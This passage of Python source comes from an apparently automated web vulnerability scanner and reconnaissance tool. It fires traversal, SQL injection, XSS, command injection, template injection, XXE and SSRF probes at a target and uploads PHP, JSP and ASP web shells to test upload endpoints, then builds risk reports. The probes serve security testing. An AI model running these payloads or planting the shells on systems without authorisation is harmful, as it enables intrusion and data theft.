                        'file': pattern,
                        'url': test_url,
                        'size': len(response.content)
                    }
                    
                    self.results['details']['data_leaks'].append(backup_info)
                    self.results['summary']['data_leaks'] += 1
                    logger.warning(f"{Fore.RED}[!] Backup file found: {test_url}")
                
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] Backup check failed for {pattern}: {e}")
    
    # ==================== ADVANCED VULNERABILITY SCANNING ====================
    
    def advanced_vulnerability_scanning(self):
        """Perform advanced vulnerability scanning"""
        logger.info(f"{Fore.CYAN}[*] Starting advanced vulnerability scanning...")
        
        # OWASP Top 10 checks
        self._owasp_top10_checks()
        
        # Authentication bypass testing
        self._auth_bypass_testing()
        
        # Business logic testing
        self._business_logic_testing()
        
        # IDOR testing
        self._idor_testing()
        
        # File upload testing
        self._file_upload_testing()
        
        # SSRF testing
        self._ssrf_testing()
        
        # XXE testing
        self._xxe_testing()
        
        # Command injection testing
        self._command_injection_testing()
        
        # Template injection testing
        self._template_injection_testing()
    
    def _owasp_top10_checks(self):
        """Check for OWASP Top 10 vulnerabilities"""
        logger.info(f"{Fore.YELLOW}[*] Running OWASP Top 10 checks...")
        
        # A01: Broken Access Control
        self._broken_access_control_test()
        
        # A02: Cryptographic Failures
        self._cryptographic_failures_test()
        
        # A03: Injection
        self._injection_tests()
        
        # A04: Insecure Design
        self._insecure_design_test()
        
        # A05: Security Misconfiguration
        self._security_misconfiguration_test()
        
        # A06: Vulnerable Components
        self._vulnerable_components_test()
        
        # A07: Authentication Failures
        self._authentication_failures_test()
        
        # A08: Software Integrity Failures
        self._software_integrity_test()
        
        # A09: Security Logging Failures
        self._security_logging_test()
        
        # A10: Server-Side Request Forgery
        self._ssrf_testing()
    
    def _broken_access_control_test(self):
        """Test for broken access control"""
        logger.info(f"{Fore.CYAN}[*] Testing for broken access control...")
        
        # Test directory traversal
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '%2e%2e%2fetc%2fpasswd',
            '....//....//etc/passwd'
        ]
        
        for payload in traversal_payloads:
            test_url = f"{self.target}/{payload}"
            try:
                self._rate_limit()
                response = self.session.get(test_url, timeout=self.config.timeout)
                
                if response.status_code == 200:
                    # Check for sensitive content
                    content = response.text.lower()
                    if any(indicator in content for indicator in ['root:', 'daemon:', '[fonts]', 'administrator']):
                        vuln = {
                            'type': 'Broken Access Control',
                            'subtype': 'Directory Traversal',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High',
                            'confidence': 'Medium'
                        }
                        self._add_vulnerability(vuln)
                        logger.warning(f"{Fore.RED}[!] Directory traversal vulnerability: {test_url}")
                
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] Traversal test failed: {e}")
    
    def _injection_tests(self):
        """Test for various injection vulnerabilities"""
        logger.info(f"{Fore.CYAN}[*] Testing for injection vulnerabilities...")
        
        # SQL Injection
        self._sql_injection_test()
        
        # XSS
        self._xss_test()
        
        # Command Injection
        self._command_injection_testing()
        
        # XXE
        self._xxe_testing()
    
    def _sql_injection_test(self):
        """Test for SQL injection vulnerabilities"""
        test_payloads = [
            "'", "''", "`", "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
            "admin' --",
            "admin' #"
        ]
        
        # Test parameters
        parsed = urlparse(self.target)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    for payload in test_payloads:
                        test_url = self.target.replace(param, f"{key}={payload}")
                        try:
                            self._rate_limit()
                            response = self.session.get(test_url, timeout=self.config.timeout)
                            
                            # Check for SQL errors
                            error_indicators = [
                                'sql', 'database', 'mysql', 'postgresql',
                                'syntax error', 'unclosed quotation',
                                'you have an error in your sql'
                            ]
                            
                            content = response.text.lower()
                            if any(error in content for error in error_indicators):
                                vuln = {
                                    'type': 'Injection',
                                    'subtype': 'SQL Injection',
                                    'url': test_url,
                                    'parameter': key,
                                    'payload': payload,
                                    'severity': 'High',
                                    'confidence': 'Medium'
                                }
                                self._add_vulnerability(vuln)
                                logger.warning(f"{Fore.RED}[!] SQL Injection vulnerability: {key}={payload}")
                        
                        except Exception as e:
                            logger.debug(f"{Fore.YELLOW}[-] SQLi test failed: {e}")
    
    def _xss_test(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        test_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            'javascript:alert(1)',
            '<body onload=alert(1)>'
        ]
        
        # Test parameters
        parsed = urlparse(self.target)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    for payload in test_payloads:
                        test_url = self.target.replace(param, f"{key}={quote(payload)}")
                        try:
                            self._rate_limit()
                            response = self.session.get(test_url, timeout=self.config.timeout)
                            
                            # Check if payload is reflected
                            if payload in response.text:
                                vuln = {
                                    'type': 'Injection',
                                    'subtype': 'Cross-Site Scripting',
                                    'url': test_url,
                                    'parameter': key,
                                    'payload': payload,
                                    'severity': 'Medium',
                                    'confidence': 'Low'
                                }
                                self._add_vulnerability(vuln)
                                logger.warning(f"{Fore.RED}[!] XSS vulnerability: {key}={payload[:20]}...")
                        
                        except Exception as e:
                            logger.debug(f"{Fore.YELLOW}[-] XSS test failed: {e}")
    
    def _auth_bypass_testing(self):
        """Test for authentication bypass vulnerabilities"""
        logger.info(f"{Fore.CYAN}[*] Testing for authentication bypass...")
        
        # Common authentication bypass techniques
        bypass_techniques = [
            ('/admin', ['/admin/../admin', '/admin;', '/admin..;/']),
            ('/login', ['/login/../login', '/login;', '/login..;/']),
            ('/dashboard', ['/dashboard/../dashboard', '/dashboard;', '/dashboard..;/'])
        ]
        
        for base_path, bypass_paths in bypass_techniques:
            for bypass_path in bypass_paths:
                test_url = f"{self.target}{bypass_path}"
                try:
                    self._rate_limit()
                    response = self.session.get(test_url, timeout=self.config.timeout)
                    
                    if response.status_code == 200:
                        # Check if we bypassed authentication
                        if 'login' not in response.text.lower() and 'password' not in response.text.lower():
                            vuln = {
                                'type': 'Authentication Bypass',
                                'url': test_url,
                                'technique': bypass_path,
                                'severity': 'Critical',
                                'confidence': 'Low'
                            }
                            self._add_vulnerability(vuln)
                            logger.warning(f"{Fore.RED}[!] Possible auth bypass: {test_url}")
                
                except Exception as e:
                    logger.debug(f"{Fore.YELLOW}[-] Auth bypass test failed: {e}")
    
    def _idor_testing(self):
        """Test for Insecure Direct Object References"""
        logger.info(f"{Fore.CYAN}[*] Testing for IDOR vulnerabilities...")
        
        # Look for numeric IDs in URL
        parsed = urlparse(self.target)
        path_parts = parsed.path.split('/')
        
        for i, part in enumerate(path_parts):
            if part.isdigit():
                # Test with different IDs
                test_ids = ['1', '0', '999', str(int(part) + 1), str(int(part) - 1)]
                
                for test_id in test_ids:
                    test_path = '/'.join(path_parts[:i] + [test_id] + path_parts[i+1:])
                    test_url = f"{parsed.scheme}://{parsed.netloc}/{test_path}"
                    
                    try:
                        self._rate_limit()
                        response = self.session.get(test_url, timeout=self.config.timeout)
                        
                        if response.status_code == 200:
                            vuln = {
                                'type': 'Insecure Direct Object Reference',
                                'url': test_url,
                                'original_id': part,
                                'tested_id': test_id,
                                'severity': 'Medium',
                                'confidence': 'Low'
                            }
                            self._add_vulnerability(vuln)
                            logger.warning(f"{Fore.RED}[!] Possible IDOR: {test_url}")
                    
                    except Exception as e:
                        logger.debug(f"{Fore.YELLOW}[-] IDOR test failed: {e}")
    
    def _file_upload_testing(self):
        """Test for file upload vulnerabilities"""
        logger.info(f"{Fore.CYAN}[*] Testing for file upload vulnerabilities...")
        
        # Look for upload endpoints
        upload_patterns = ['/upload', '/file/upload', '/image/upload', '/attachment/upload']
        
        for pattern in upload_patterns:
            test_url = f"{self.target}{pattern}"
            try:
                self._rate_limit()
                response = self.session.get(test_url, timeout=self.config.timeout)
                
                if response.status_code == 200:
                    # Check for upload forms
                    if 'upload' in response.text.lower() or 'file' in response.text.lower():
                        logger.info(f"{Fore.GREEN}[+] Found upload endpoint: {test_url}")
                        
                        # Test malicious file uploads
                        self._test_malicious_uploads(test_url)
                
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] Upload test failed: {e}")
    
    def _test_malicious_uploads(self, upload_url: str):
        """Test malicious file uploads"""
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/jsp'),
            ('shell.asp', '<% eval request("cmd") %>', 'application/asp'),
            ('test.html', '<script>alert(1)</script>', 'text/html'),
            ('test.svg', '<svg onload=alert(1)>', 'image/svg+xml')
        ]
        
        for filename, content, content_type in malicious_files:
            try:
                files = {'file': (filename, content, content_type)}
                response = self.session.post(upload_url, files=files, timeout=self.config.timeout)
                
                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'File Upload Vulnerability',
                        'url': upload_url,
                        'filename': filename,
                        'severity': 'High',
                        'confidence': 'Low'
                    }
                    self._add_vulnerability(vuln)
                    logger.warning(f"{Fore.RED}[!] Possible file upload vulnerability with {filename}")
            
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] Malicious upload test failed: {e}")
    
    def _ssrf_testing(self):
        """Test for Server-Side Request Forgery"""
        logger.info(f"{Fore.CYAN}[*] Testing for SSRF vulnerabilities...")
        
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'http://[::1]:22',
            'file:///etc/passwd'
        ]
        
        # Look for URL parameters
        parsed = urlparse(self.target)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    if any(url_keyword in key.lower() for url_keyword in ['url', 'link', 'src', 'image']):
                        for payload in ssrf_payloads:
                            test_url = self.target.replace(param, f"{key}={quote(payload)}")
                            try:
                                self._rate_limit()
                                response = self.session.get(test_url, timeout=self.config.timeout)
                                
                                # Check for SSRF indicators
                                if any(indicator in response.text for indicator in [
                                    'instance-id', 'ami-id', 'public-keys',
                                    'root:', 'daemon:', 'AccessDenied'
                                ]):
                                    vuln = {
                                        'type': 'Server-Side Request Forgery',
                                        'url': test_url,
                                        'parameter': key,
                                        'payload': payload,
                                        'severity': 'High',
                                        'confidence': 'Low'
                                    }
                                    self._add_vulnerability(vuln)
                                    logger.warning(f"{Fore.RED}[!] Possible SSRF: {key}={payload}")
                            
                            except Exception as e:
                                logger.debug(f"{Fore.YELLOW}[-] SSRF test failed: {e}")
    
    def _xxe_testing(self):
        """Test for XXE vulnerabilities"""
        logger.info(f"{Fore.CYAN}[*] Testing for XXE vulnerabilities...")
        
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>&test;</root>'''
        
        # Check XML endpoints
        xml_endpoints = ['/xml', '/soap', '/api/xml', '/rest/xml', '/feed']
        
        for endpoint in xml_endpoints:
            test_url = f"{self.target}{endpoint}"
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(test_url, data=xxe_payload, headers=headers, timeout=self.config.timeout)
                
                if 'root:' in response.text and 'daemon:' in response.text:
                    vuln = {
                        'type': 'XML External Entity',
                        'url': test_url,
                        'severity': 'High',
                        'confidence': 'Medium'
                    }
                    self._add_vulnerability(vuln)
                    logger.warning(f"{Fore.RED}[!] XXE vulnerability: {test_url}")
            
            except Exception as e:
                logger.debug(f"{Fore.YELLOW}[-] XXE test failed for {endpoint}: {e}")
    
    def _command_injection_testing(self):
        """Test for command injection vulnerabilities"""
        logger.info(f"{Fore.CYAN}[*] Testing for command injection...")
        
        cmd_payloads = [
            ';id', ';whoami', ';ls', ';pwd',
            '|id', '|whoami',
            '`id`', '`whoami`',
            '$(id)', '$(whoami)',
            '||id', '||whoami',
            '&&id', '&&whoami'
        ]
        
        # Look for command parameters
        parsed = urlparse(self.target)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    if any(cmd_keyword in key.lower() for cmd_keyword in ['cmd', 'command', 'exec', 'system']):
                        for payload in cmd_payloads:
                            test_url = self.target.replace(param, f"{key}={payload}")
                            try:
                                self._rate_limit()
                                response = self.session.get(test_url, timeout=self.config.timeout)
                                
                                # Check for command output
                                if any(output in response.text for output in [
                                    'uid=', 'gid=', 'groups=', 'root',
                                    'bin/bash', 'usr/bin', 'administrator'
                                ]):
                                    vuln = {
                                        'type': 'Command Injection',
                                        'url': test_url,
                                        'parameter': key,
                                        'payload': payload,
                                        'severity': 'Critical',
                                        'confidence': 'Medium'
                                    }
                                    self._add_vulnerability(vuln)
                                    logger.warning(f"{Fore.RED}[!] Command injection: {key}={payload}")
                            
                            except Exception as e:
                                logger.debug(f"{Fore.YELLOW}[-] Command injection test failed: {e}")
    
    def _template_injection_testing(self):
        """Test for template injection vulnerabilities"""
        logger.info(f"{Fore.CYAN}[*] Testing for template injection...")
        
        template_payloads = [
            '{{7*7}}', '{{7*7}}', '${7*7}',
            '<%= 7*7 %>', '${{7*7}}', '#{7*7}'
        ]
        
        # Test parameters
        parsed = urlparse(self.target)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    for payload in template_payloads:
                        test_url = self.target.replace(param, f"{key}={quote(payload)}")
                        try:
                            self._rate_limit()
                            response = self.session.get(test_url, timeout=self.config.timeout)
                            
                            # Check if template was evaluated
                            if '49' in response.text:
                                vuln = {
                                    'type': 'Template Injection',
                                    'url': test_url,
                                    'parameter': key,
                                    'payload': payload,
                                    'severity': 'High',
                                    'confidence': 'Low'
                                }
                                self._add_vulnerability(vuln)
                                logger.warning(f"{Fore.RED}[!] Template injection: {key}={payload}")
                        
                        except Exception as e:
                            logger.debug(f"{Fore.YELLOW}[-] Template injection test failed: {e}")
    
    def _add_vulnerability(self, vuln: Dict):
        """Add vulnerability to results"""
        self.results['details']['vulnerabilities'].append(vuln)
        self.results['summary']['vulnerabilities'] += 1
    
    # ==================== CLOUD & INFRASTRUCTURE ====================
    
    def cloud_infrastructure_recon(self):
        """Perform cloud infrastructure reconnaissance"""
        logger.info(f"{Fore.CYAN}[*] Analyzing cloud infrastructure...")
        
        # Detect cloud provider
        self._detect_cloud_provider()
        
        # Check for cloud misconfigurations
        self._check_cloud_misconfigurations()
        
        # Analyze CDN
        self._analyze_cdn()
        
        # Check for exposed cloud services
        self._check_exposed_cloud_services()
    
    def _detect_cloud_provider(self):
        """Detect cloud hosting provider"""
        try:
            response = self.session.get(self.target, timeout=self.config.timeout)
            headers = response.headers
            
            cloud_indicators = {
                'AWS': ['x-amz-', 'amazon', 'aws', 'ec2', 's3'],
                'Azure': ['azure', 'microsoft', 'windows-azure'],
                'Google Cloud': ['google', 'gcp', 'gce', 'google-cloud'],
                'Cloudflare': ['cloudflare', 'cf-', '__cfduid'],
                'Fastly': ['fastly', 'x-served-by'],
                'Akamai': ['akamai', 'x-akamai'],
                'Heroku': ['heroku', 'x-powered-by: heroku'],
                'DigitalOcean': ['digitalocean', 'do'],
                'Linode': ['linode'],
                'Vultr': ['vultr']
            }
            
            detected_providers = set()
            for provider, indicators in cloud_indicators.items():
                for indicator in indicators:
                    if any(indicator.lower() in header.lower() or indicator.lower() in value.lower() 
                          for header, value in headers.items()):
                        detected_providers.add(provider)
            
            if detected_providers:
                self.results['details']['cloud_info']['providers'] = list(detected_providers)
                logger.info(f"{Fore.GREEN}[+] Detected cloud providers: {', '.join(detected_providers)}")
            else:
                logger.info(f"{Fore.YELLOW}[-] No cloud provider detected")
        
        except Exception as e:
            logger.error(f"{Fore.RED}[-] Cloud detection failed: {e}")
    
    def _check_cloud_misconfigurations(self):
        """Check for common cloud misconfigurations"""
        # S3 bucket checks for AWS
        s3_patterns = [
            f"https://{self.base_domain}.s3.amazonaws.com",
            f"https://s3.amazonaws.com/{self.base_domain}",
            f"https://{self.base_domain.replace('.', '-')}.s3.amazonaws.com"
        ]
        
        for pattern in s3_patterns:
            try:
                response = self.session.get(pattern, timeout=self.config.timeout)
                if response.status_code == 200:
                    logger.warning(f"{Fore.RED}[!] Public S3 bucket found: {pattern}")
                    self.results['details']['cloud_info']['s3_bucket'] = pattern
            except:
                pass
    
    def _analyze_cdn(self):
        """Analyze CDN usage"""
        try:
            response = self.session.get(self.target, timeout=self.config.timeout)
            headers = response.headers
            
            cdn_headers = ['server', 'via', 'x-cache', 'x-served-by', 'x-cdn']
            cdn_info = {}
            
            for header in cdn_headers:
                if header in headers:
                    cdn_info[header] = headers[header]
            
            if cdn_info:
                self.results['details']['cloud_info']['cdn'] = cdn_info
                logger.info(f"{Fore.GREEN}[+] CDN detected: {cdn_info}")
        
        except Exception as e:
            logger.error(f"{Fore.RED}[-] CDN analysis failed: {e}")
    
    def _check_exposed_cloud_services(self):
        """Check for exposed cloud services"""
        cloud_services = {
            'AWS Console': 'https://console.aws.amazon.com',
            'Azure Portal': 'https://portal.azure.com',
            'GCP Console': 'https://console.cloud.google.com',
            'AWS S3': f'https://s3.console.aws.amazon.com/s3/buckets/{self.base_domain}',
            'CloudTrail': 'https://console.aws.amazon.com/cloudtrail',
            'CloudWatch': 'https://console.aws.amazon.com/cloudwatch'
        }
        
        # These would typically require authentication
        # Just logging for awareness
        for service, url in cloud_services.items():
            logger.info(f"{Fore.CYAN}[*] Cloud service: {service} - {url}")
    
    # ==================== AUTOMATION & ORCHESTRATION ====================
    
    def automated_workflow(self):
        """Run automated reconnaissance workflow"""
        logger.info(f"{Fore.CYAN}[*] Starting automated reconnaissance workflow...")
        
        # Phase 1: Discovery
        self._phase_discovery()
        
        # Phase 2: Enumeration
        self._phase_enumeration()
        
        # Phase 3: Vulnerability Assessment
        self._phase_vulnerability_assessment()
        
        # Phase 4: Data Analysis
        self._phase_data_analysis()
        
        # Phase 5: Reporting
        self._phase_reporting()
    
    def _phase_discovery(self):
        """Phase 1: Discovery"""
        logger.info(f"{Fore.MAGENTA}[*] PHASE 1: DISCOVERY")
        
        # Integrate SecLists
        self.integrate_seclists()
        
        # Enhanced DNS recon
        self.enhanced_dns_recon()
        
        # Run Kali tools
        self.run_kali_tools()
    
    def _phase_enumeration(self):
        """Phase 2: Enumeration"""
        logger.info(f"{Fore.MAGENTA}[*] PHASE 2: ENUMERATION")
        
        # Advanced web enumeration
        self.advanced_web_enumeration()
        
        # Cloud infrastructure recon
        self.cloud_infrastructure_recon()
        
        # Technology stack analysis
        self._analyze_technology_stack()
    
    def _phase_vulnerability_assessment(self):
        """Phase 3: Vulnerability Assessment"""
        logger.info(f"{Fore.MAGENTA}[*] PHASE 3: VULNERABILITY ASSESSMENT")
        
        # Advanced vulnerability scanning
        self.advanced_vulnerability_scanning()
        
        # Run automated tools
        self.run_vulnerability_tools()
    
    def _phase_data_analysis(self):
        """Phase 4: Data Analysis"""
        logger.info(f"{Fore.MAGENTA}[*] PHASE 4: DATA ANALYSIS")
        
        # Analyze collected data
        self._analyze_collected_data()
        
        # Generate insights
        self._generate_insights()
    
    def _phase_reporting(self):
        """Phase 5: Reporting"""
        logger.info(f"{Fore.MAGENTA}[*] PHASE 5: REPORTING")
        
        # Generate comprehensive reports
        self.generate_comprehensive_reports()
        
        # Create executive summary
        self._create_executive_summary()
    
    def _analyze_technology_stack(self):
        """Analyze technology stack"""
        logger.info(f"{Fore.CYAN}[*] Analyzing technology stack...")
        
        try:
            response = self.session.get(self.target, timeout=self.config.timeout)
            
            tech_stack = {
                'server': response.headers.get('Server', ''),
                'powered_by': response.headers.get('X-Powered-By', ''),
                'framework': self._detect_framework(response.text),
                'languages': self._detect_languages(response.text),
                'database': self._detect_database(response.text),
                'cdn': response.headers.get('Via', ''),
                'security_headers': self._check_security_headers(response.headers)
            }
            
            self.results['details']['technologies'] = tech_stack
            logger.info(f"{Fore.GREEN}[+] Technology stack: {tech_stack}")
        
        except Exception as e:
            logger.error(f"{Fore.RED}[-] Technology analysis failed: {e}")
    
    def _detect_framework(self, content: str) -> List[str]:
        """Detect web frameworks"""
        frameworks = []
        
        framework_patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Drupal': ['drupal', 'sites/all'],
            'Joomla': ['joomla', 'com_content'],
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrfmiddleware'],
            'Ruby on Rails': ['rails', 'ruby'],
            'React': ['react', 'react-dom'],
            'Angular': ['angular', 'ng-'],
            'Vue.js': ['vue', 'v-'],
            'Express.js': ['express'],
            'Spring': ['spring']
        }
        
        content_lower = content.lower()
        for framework, patterns in framework_patterns.items():
            if any(pattern in content_lower for pattern in patterns):
                frameworks.append(framework)
        
        return frameworks
    
    def _detect_languages(self, content: str) -> List[str]:
        """Detect programming languages"""
        languages = []
        
        language_patterns = {
            'PHP': ['<?php', '.php', 'phpinfo'],
            'Python': ['.py', 'python/', 'django'],
            'Java': ['.jsp', '.java', 'servlet'],
            'JavaScript': ['.js', 'javascript:', 'node.js'],
            'Ruby': ['.rb', '.erb', 'ruby'],
            'ASP.NET': ['.aspx', 'asp.net', '__viewstate'],
            'Go': ['go/', 'golang']
        }
        
        content_lower = content.lower()
        for language, patterns in language_patterns.items():
            if any(pattern in content_lower for pattern in patterns):
                languages.append(language)
        
        return languages
    
    def _detect_database(self, content: str) -> List[str]:
        """Detect databases"""
        databases = []
        
        db_patterns = {
            'MySQL': ['mysql', 'mysqli_'],
            'PostgreSQL': ['postgresql', 'pg_'],
            'MongoDB': ['mongodb'],
            'Redis': ['redis'],
            'SQLite': ['sqlite'],
            'Oracle': ['oracle']
        }
        
        content_lower = content.lower()
        for db, patterns in db_patterns.items():
            if any(pattern in content_lower for pattern in patterns):
                databases.append(db)
        
        return databases
    
    def _check_security_headers(self, headers: Dict) -> Dict:
        """Check security headers"""
        security_headers = {
            'Content-Security-Policy': headers.get('Content-Security-Policy'),
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
            'Referrer-Policy': headers.get('Referrer-Policy'),
            'Permissions-Policy': headers.get('Permissions-Policy'),
            'X-XSS-Protection': headers.get('X-XSS-Protection')
        }
        
        return security_headers
    
    def _analyze_collected_data(self):
        """Analyze collected data for patterns and insights"""
        logger.info(f"{Fore.CYAN}[*] Analyzing collected data...")
        
        # Analyze subdomain patterns
        self._analyze_subdomain_patterns()
        
        # Analyze vulnerability patterns
        self._analyze_vulnerability_patterns()
        
        # Generate risk assessment
        self._generate_risk_assessment()
    
    def _analyze_subdomain_patterns(self):
        """Analyze subdomain naming patterns"""
        subdomains = self.results['details']['subdomains']
        
        if subdomains:
            patterns = {}
            for subdomain in subdomains:
                parts = subdomain.split('.')
                if len(parts) > 2:
                    prefix = parts[0]
                    patterns[prefix] = patterns.get(prefix, 0) + 1
            
            # Sort by frequency
            sorted_patterns = sorted(patterns.items(), key=lambda x: x[1], reverse=True)
            
            logger.info(f"{Fore.GREEN}[+] Subdomain patterns: {sorted_patterns[:10]}")
            self.results['details']['subdomain_patterns'] = dict(sorted_patterns[:10])
    
    def _analyze_vulnerability_patterns(self):
        """Analyze vulnerability patterns"""
        vulnerabilities = self.results['details']['vulnerabilities']
        
        if vulnerabilities:
            severity_counts = {}
            type_counts = {}
            
            for vuln in vulnerabilities:
                severity = vuln.get('severity', 'Unknown')
                vuln_type = vuln.get('type', 'Unknown')
                
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
                type_counts[vuln_type] = type_counts.get(vuln_type, 0) + 1
            
            logger.info(f"{Fore.GREEN}[+] Vulnerability severity: {severity_counts}")
            logger.info(f"{Fore.GREEN}[+] Vulnerability types: {type_counts}")
    
    def _generate_risk_assessment(self):
        """Generate risk assessment"""
        vulnerabilities = self.results['details']['vulnerabilities']
        
        risk_score = 0
        critical_count = 0
        high_count = 0
        medium_count = 0
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Low')
            if severity == 'Critical':
                risk_score += 10
                critical_count += 1
            elif severity == 'High':
                risk_score += 5
                high_count += 1
            elif severity == 'Medium':
                risk_score += 2
                medium_count += 1
            elif severity == 'Low':
                risk_score += 1
        
        # Normalize risk score
        risk_score = min(risk_score, 100)
        
        risk_assessment = {
            'score': risk_score,
            'level': self._get_risk_level(risk_score),
            'critical_vulnerabilities': critical_count,
            'high_vulnerabilities': high_count,
            'medium_vulnerabilities': medium_count,
            'total_vulnerabilities': len(vulnerabilities)
        }
        
        self.results['details']['risk_assessment'] = risk_assessment
        logger.info(f"{Fore.CYAN}[*] Risk Assessment: {risk_assessment}")
    
    def _get_risk_level(self, score: int) -> str:
        """Get risk level from score"""
        if score >= 80:
            return 'Critical'
        elif score >= 60:
            return 'High'
        elif score >= 40:
            return 'Medium'
        elif score >= 20:
            return 'Low'
        else:
            return 'Informational'
    
    def _generate_insights(self):
        """Generate insights from collected data"""
        logger.info(f"{Fore.CYAN}[*] Generating insights...")
        
        insights = []
        
        # Technology insights
        tech_stack = self.results['details'].get('technologies', {})
        if tech_stack:
            if 'WordPress' in tech_stack.get('framework', []):
                insights.append("WordPress detected - check for outdated plugins/themes")
            if not tech_stack.get('security_headers', {}).get('Content-Security-Policy'):
                insights.append("Missing Content-Security-Policy header")
        
        # Vulnerability insights
        vulnerabilities = self.results['details'].get('vulnerabilities', [])
        if vulnerabilities:
            critical_vulns = [v for v in vulnerabilities if v.get('severity') == 'Critical']
            if critical_vulns:
                insights.append(f"Found {len(critical_vulns)} critical vulnerabilities requiring immediate attention")
        
        # Data leakage insights
        data_leaks = self.results['details'].get('data_leaks', [])
        if data_leaks:
            insights.append(f"Found {len(data_leaks)} potential data leaks")
        
        self.results['details']['insights'] = insights
        logger.info(f"{Fore.GREEN}[+] Generated {len(insights)} insights")
    
    def _create_executive_summary(self):
        """Create executive summary"""
        summary = {
            'target': self.target,
            'scan_date': self.results['scan_start'],
            'duration': time.time() - self.stats['start_time'],
            'overall_risk': self.results['details'].get('risk_assessment', {}).get('level', 'Unknown'),
            'key_findings': {
                'subdomains_discovered': self.results['summary']['subdomains'],
                'vulnerabilities_found': self.results['summary']['vulnerabilities'],
                'data_leaks_identified': self.results['summary']['data_leaks'],
                'critical_issues': len([v for v in self.results['details']['vulnerabilities'] 
                                       if v.get('severity') == 'Critical'])
            },
            'recommendations': self._generate_recommendations()
        }
        
        self.results['executive_summary'] = summary
        
        # Save executive summary separately
        summary_file = os.path.join(self.config.output_dir, 'reports', 'executive_summary.json')
        with open(summary_file, 'w') as f:
            json.dump(summary, f, indent=2)
        
        logger.info(f"{Fore.GREEN}[+] Executive summary created")
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Based on findings
        vulnerabilities = self.results['details'].get('vulnerabilities', [])
        data_leaks = self.results['details'].get('data_leaks', [])
        tech_stack = self.results['details'].get('technologies', {})
        
        # General recommendations
        recommendations.append("Implement regular security assessments and penetration testing")
        recommendations.append("Establish a vulnerability management program")
        recommendations.append("Implement secure coding practices and training")
        
        # Specific recommendations based on findings
        if vulnerabilities:
            recommendations.append("Address all critical and high severity vulnerabilities immediately")
        
        if data_leaks:
            recommendations.append("Review and secure exposed data and credentials")
        
        security_headers = tech_stack.get('security_headers', {})
        if not security_headers.get('Content-Security-Policy'):
            recommendations.append("Implement Content Security Policy (CSP)")
        
        if not security_headers.get('Strict-Transport-Security'):
            recommendations.append("Enable HTTP Strict Transport Security (HSTS)")
        
        return recommendations
    
    def generate_comprehensive_reports(self):
        """Generate comprehensive reports in multiple formats"""
        logger.info(f"{Fore.CYAN}[*] Generating comprehensive reports...")
        
        # JSON report
        self._generate_json_report()
        
        # HTML report
        self._generate_html_report()
        
        # Markdown report
        self._generate_markdown_report()
        
        # CSV report
        self._generate_csv_report()
        
        # Executive report
        self._generate_executive_report()
    
    def _generate_json_report(self):
        """Generate JSON report"""
        report_file = os.path.join(self.config.output_dir, 'reports', 'full_report.json')
        
        # Add statistics
        self.results['statistics'] = {
            'scan_duration': time.time() - self.stats['start_time'],
            'requests_made': self.stats['requests_made'],
            'modules_executed': len(self.config.modules)
        }
        
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        logger.info(f"{Fore.GREEN}[+] JSON report saved: {report_file}")
    
    def _generate_html_report(self):
        """Generate HTML report"""
        html_file = os.path.join(self.config.output_dir, 'reports', 'report.html')
        
        html_template = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Security Assessment Report - {self.target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
                .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
                h1, h2, h3 {{ color: #333; }}
                .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 10px; margin-bottom: 30px; }}
                .summary {{ background: #e8f4f8; padding: 20px; border-radius: 10px; margin-bottom: 30px; }}
                .section {{ margin-bottom: 30px; padding: 20px; border-left: 5px solid #4CAF50; background: #f9f9f9; }}
                .critical {{ border-left-color: #f44336; }}
                .high {{ border-left-color: #ff9800; }}
                .medium {{ border-left-color: #ffc107; }}
                .low {{ border-left-color: #2196F3; }}
                table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
                th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
